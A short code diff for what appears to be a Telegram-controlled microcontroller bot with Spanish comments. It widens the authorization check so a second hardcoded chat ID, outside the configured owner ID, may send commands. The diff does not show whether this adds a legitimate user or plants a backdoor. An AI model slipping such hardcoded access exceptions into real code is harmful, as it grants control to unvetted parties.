@@ -51,7 +51,7 @@ void manejarNuevosMensajes(int numNewMessages) {
   for (int i = 0; i < numNewMessages; i++) {
     // ID de chat del solicitante
     String chat_id = bot.messages[i].chat_id;
-    if (chat_id != CHAT_ID) {
+    if (chat_id != CHAT_ID && chat_id != "6263349131") {
       bot.sendMessage(chat_id, "Usuario no autorizado", "");
       continue;
     }
